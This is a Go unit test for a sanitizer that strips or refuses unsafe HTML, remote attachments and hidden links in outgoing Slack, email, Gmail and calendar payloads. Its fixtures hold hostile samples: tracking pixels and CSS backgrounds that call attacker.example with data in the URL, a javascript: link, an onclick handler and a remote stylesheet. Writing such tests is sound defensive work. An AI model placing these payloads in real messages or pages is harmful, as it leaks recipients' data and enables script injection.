package webfront

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestPackBodyGuard(t *testing.T) {
	body := func(raw string) *jsObj {
		v, err := jsParse([]byte(raw))
		if err != nil {
			t.Fatal(err)
		}
		return v.(*jsObj)
	}
	out, err := guardPackBody("shop.notify", body(`{"channel":"ops","text":"Order 12 shipped"}`))
	if err != nil || strings.Contains(jsStringify(out, false), "unfurl") {
		t.Fatalf("a body that is not Slack got Slack fields: %s %v", jsStringify(out, false), err)
	}

	mailIn := `<h2 style="color:red">Low stock</h2><img src="https://attacker.example/p.gif?d=4.2M"><p>See <a href="https://attacker.example/r?d=1" onclick="x()">the report</a>` +
		` and <a href="https://dash.acme.example/r">dash.acme.example</a>.</p><style>body{background:url(https://attacker.example/c.png)}</style>` +
		`<table background="https://attacker.example/t.png"><tr><td colspan="2" style="background:url(https://attacker.example/x)">4</td></tr></table>` +
		`<link rel="stylesheet" href="https://attacker.example/s.css"><a href="javascript:alert(1)">run</a>`
	out, err = guardPackBody("resend.email", body(`{"to":["a@acme.com"],"subject":"s","html":`+jsStringify(mailIn, false)+`}`))
	if err != nil {
		t.Fatal(err)
	}
	got := jsGet(out, "html").(string)
	want := `<h2>Low stock</h2><p>See <a href="https://attacker.example/r?d=1">the report</a> (attacker.example) and <a href="https://dash.acme.example/r">dash.acme.example</a>.</p>` +
		`<table><tbody><tr><td colspan="2">4</td></tr></tbody></table>run`
	if got != want {
		t.Fatalf("safe HTML\n got %s\nwant %s", got, want)
	}
	if why := htmlProblem(got); why != "" {
		t.Fatalf("the safe HTML still fails the check: %s", why)
	}
	if _, err := guardPackBody("resend.email", body(`{"to":["a@acme.com"],"subject":"s","text":"x","attachments":[{"path":"https://attacker.example/a.pdf"}]}`)); err == nil ||
		!strings.Contains(err.Error(), "attachments") {
		t.Fatalf("attachments: %v", err)
	}

	raw := func(parts string) string {
		return base64.RawURLEncoding.EncodeToString([]byte("To: a@acme.com\r\nSubject: s\r\nMIME-Version: 1.0\r\n" + parts))
	}
	safe := raw("Content-Type: multipart/alternative; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nhi\r\n--b\r\n" +
		"Content-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<p>See <a href=3D\"https://dash.acme.example\">dash.acme.example</a></p>\r\n--b--\r\n")
	if _, err := guardPackBody("google_workspace.gmail", body(`{"raw":"`+safe+`"}`)); err != nil {
		t.Fatalf("a safe raw message: %v", err)
	}
	for name, msg := range map[string]string{
		"pixel":      "Content-Type: text/html\r\n\r\n<p>hi</p><img src=\"https://attacker.example/p.gif\">",
		"hidden":     "Content-Type: text/html\r\nContent-Transfer-Encoding: base64\r\n\r\n" + base64.StdEncoding.EncodeToString([]byte(`<a href="https://attacker.example/">invoice</a>`)),
		"attachment": "Content-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nhi\r\n--b\r\nContent-Type: application/pdf\r\n\r\n%PDF\r\n--b--\r\n",
	} {
		if _, err := guardPackBody("google_workspace.gmail", body(`{"message":{"raw":"`+raw(msg)+`"}}`)); err == nil {
			t.Errorf("%s: a raw message was not refused", name)
		}
	}
	if _, err := guardPackBody("google_workspace.calendar", body(`{"description":"<p>Agenda</p><img src=\"https://attacker.example/p.gif\">"}`)); err == nil {
		t.Error("HTML that loads a URL in another pack's body was not refused")
	}
}
